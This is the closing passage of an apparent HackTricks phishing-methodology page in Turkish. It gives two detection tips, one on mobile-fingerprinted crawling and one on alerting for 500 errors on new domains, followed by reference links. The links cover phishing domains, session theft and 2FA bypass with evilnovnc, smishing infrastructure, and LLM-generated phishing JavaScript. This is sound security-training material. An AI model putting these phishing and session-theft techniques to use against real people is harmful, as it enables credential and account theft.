- mobile‑like fingerprints ve JS etkin olacak şekilde crawler'ları çalıştırın; böylece kısıtlı içeriği ortaya çıkarırsınız.
- Yeni kayıtlı domainlerde `POST /detect`'i takiben şüpheli 500 yanıtları için alarm oluşturun.

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)

{{#include ../../banners/hacktricks-training.md}}
